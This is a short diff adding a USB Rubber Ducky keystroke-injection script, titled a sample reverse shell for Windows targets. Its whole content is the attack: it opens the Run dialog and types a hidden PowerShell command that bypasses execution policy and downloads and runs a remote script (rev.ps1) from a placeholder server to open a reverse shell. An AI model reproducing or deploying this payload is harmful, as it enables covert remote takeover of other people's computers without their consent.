@@ -1,0 +1,7 @@
+REM DUDE's Sample Reverse Shell Ducky Script
+REM For Windows Target
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://your-server.com/rev.ps1')"
+ENTER
